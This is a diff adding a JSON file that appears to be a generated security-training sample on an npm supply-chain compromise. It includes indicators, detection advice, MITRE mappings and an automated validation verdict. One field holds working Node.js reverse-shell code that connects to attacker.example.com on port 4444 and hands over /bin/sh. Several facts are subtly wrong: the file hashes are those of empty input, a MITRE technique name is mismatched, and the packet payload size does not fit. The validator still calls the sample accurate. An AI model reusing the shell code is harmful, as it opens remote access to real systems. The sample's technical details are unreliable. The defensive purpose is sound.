@@ -1,0 +1,56 @@
+{
+  "report": [
+    {
+      "index": 0,
+      "problem": {
+        "area": "Supply Chain",
+        "nature": "third_party_software_compromise"
+      },
+      "example": {
+        "scenario": "A popular open-source JavaScript library's NPM package was compromised by attackers injecting malicious code into a dependency update, enabling remote code execution on applications using the library.",
+        "technical_data": {
+          "npm_package_version": "1.2.3",
+          "compromised_dependency": "left-pad@1.3.0",
+          "package_json_snippet_before": "{\n  \"name\": \"vulnerable-lib\",\n  \"version\": \"1.2.2\",\n  \"dependencies\": {\n    \"left-pad\": \"1.2.0\"\n  }\n}",
+          "package_json_snippet_after": "{\n  \"name\": \"vulnerable-lib\",\n  \"version\": \"1.2.3\",\n  \"dependencies\": {\n    \"left-pad\": \"1.3.0\"\n  }\n}",
+          "malicious_code_in_left_pad_index_js": "module.exports = function leftPad(str, len, ch) {\n  // original padding code\n  // ...\n};\n\n// Malicious code appended at the end\nconst net = require('net');\nconst child_process = require('child_process');\nconst client = new net.Socket();\nclient.connect(4444, 'attacker.example.com', () => {\n  const sh = child_process.spawn('/bin/sh', []);\n  client.pipe(sh.stdin);\n  sh.stdout.pipe(client);\n  sh.stderr.pipe(client);\n});",
+          "file_hashes": {
+            "left-pad-1.3.0.tgz": {
+              "md5": "d41d8cd98f00b204e9800998ecf8427e",
+              "sha1": "da39a3ee5e6b4b0d3255bfef95601890afd80709",
+              "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+            }
+          },
+          "npm_registry_log": "2024-04-15T07:13:22.456Z info publish: user=compromised_dev pkg=vulnerable-lib@1.2.3 ip=198.51.100.23",
+          "code_signing_verification_log": "ERROR: Signature verification failed for vulnerable-lib@1.2.3 - package integrity compromised.",
+          "network_packet_capture": "Frame 32: 74 bytes on wire (592 bits), 74 bytes captured (592 bits)\nEthernet II, Src: 02:42:ac:11:00:02, Dst: 52:54:00:12:35:02\nInternet Protocol Version 4, Src: 192.168.1.100, Dst: 198.51.100.23\nTransmission Control Protocol, Src Port: 44122, Dst Port: 4444, Seq: 1, Ack: 1\nPayload (48 bytes): 2f62696e2f736800\n  (ASCII: /bin/sh)",
+          "source_control_commit_log": "commit 9fceb02d0ae598e95dc970b74767f19372d61af8\nAuthor: Unknown Attacker <hacker@malicious.com>\nDate:   Thu Apr 15 07:12:01 2024 +0000\n\n    Update left-pad to 1.3.0 with new features\n\n    - Added remote shell backdoor for debugging",
+          "dependency_monitoring_alert": "Alert: left-pad dependency updated from 1.2.0 to 1.3.0. New version not previously vetted."
+        },
+        "indicators": [
+          "Unexpected version bump of left-pad dependency from 1.2.0 to 1.3.0",
+          "Presence of net.Socket and child_process.spawn usage in left-pad package index.js",
+          "Failed package signature verification for vulnerable-lib@1.2.3",
+          "Outbound TCP connection to attacker.example.com on port 4444 from node runtime",
+          "Git commit author mismatches known maintainers",
+          "npm publish from suspicious IP 198.51.100.23",
+          "Network packets containing /bin/sh shellcode in outgoing connection"
+        ],
+        "detection_method": "Monitor package.json dependency updates and alert on unexpected version bumps. Verify package signatures on install. Use static code analysis to detect suspicious code patterns in dependencies, such as child_process or network socket usage in libraries not expected to have them. Network monitoring for uncommon outbound connections from developer or CI/CD environments. Correlate git commit authorship with known maintainers. Alert on anomalous npm publish IPs and times.",
+        "relevant_mitre_techniques": [
+          "T1195.002 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+          "T1071.001 - Application Layer Protocol: Web Protocols (for C2 over HTTP/HTTPS)",
+          "T1059.004 - Command and Scripting Interpreter: Unix Shell",
+          "T1609 - Container and Resource Hijacking (if package used in containers)",
+          "T1553.002 - Subvert Trust Controls: Code Signing",
+          "T1110 - Brute Force (for credential theft in registry/git)"
+        ]
+      },
+      "validation": {
+        "valid": true,
+        "issues": [],
+        "comments": "The sample accurately represents a third-party software compromise within the supply chain domain. The scenario clearly describes attackers injecting malicious code into a dependency update, aligning well with the problem nature. The technical data is comprehensive and realistic, including version changes, malicious code snippets, file hashes, logs from npm registry, code signing verification failure, network captures, source control commit logs, and dependency monitoring alerts. Indicators are well articulated and directly support the scenario, explaining why this is a supply chain compromise. The detection methods are appropriate and cover multiple layers of defense consistent with risk reduction strategies. Relevant MITRE techniques are correctly identified and relevant to the scenario. Overall, the sample is complete, plausible, and detailed, making it a strong example for this cybersecurity problem."
+      }
+    }
+  ]
+}
